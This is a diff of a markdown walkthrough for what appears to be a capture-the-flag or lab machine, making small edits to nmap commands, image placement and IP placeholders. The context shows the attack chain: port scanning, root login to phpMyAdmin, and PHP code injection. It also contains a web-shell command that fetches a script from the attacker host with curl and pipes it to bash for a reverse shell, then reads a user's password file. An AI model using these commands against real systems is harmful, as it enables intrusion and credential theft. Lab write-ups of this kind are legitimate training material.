@@ -3,7 +3,7 @@
 As the network config changes depending on the virtualization system used, we start by getting our IP address and scanning the network
 
 ```ifconfig```
-```nmap -sn -T4 <Network>```
+```nmap -T4 <Network>```
 
 ![](./img/01-ifconfig.png)
 ![](./img/02-nmap_network.png)
@@ -16,7 +16,7 @@ Thanks to the info obtained, we can test our connectivity to the system and know
 
 As the TTL is 64, we can assume that the server is running on Linux. We can proceed with the port scan
 
-```nmap -sVC -p- -T4 <TargetIP>```
+```nmap -sV -sC -p- -T4 <TargetIP>```
 
 ![](./img/04-nmap_target.png)
 
@@ -49,9 +49,10 @@ Using this email address and the previously obtained password, we successfully l
 
 We can now authenticate in the /phpmyadmin service, gaining access to the DB. As the compromised user is root, it is likely that we have file permissions on the system. Therefore, we can try to gain access to the server by injecting PHP code to an accessible file by making use of a reverse shell.
 
+![](./img/09-RCE.png)
+
 ```https://10.0.2.5/forum/templates_c/rce.php?cmd=curl 10.0.2.15:9090/shell.sh | bash```
 
-![](./img/09-RCE.png)
 
 *POST EXPLOITATION*
 
@@ -64,7 +65,7 @@ After some basic local enumeration, we can get the following information:
 Reading the file reveals the system credentials for lmezard, although ssh connection is restricted for this user.
 
 ```cat /home/LOOKATME/password```
-```ssh lmezard@IP```
+```ssh lmezard@<IP>```
 ```su lmezard```
 
 ![](./img/10-lmezard.png)
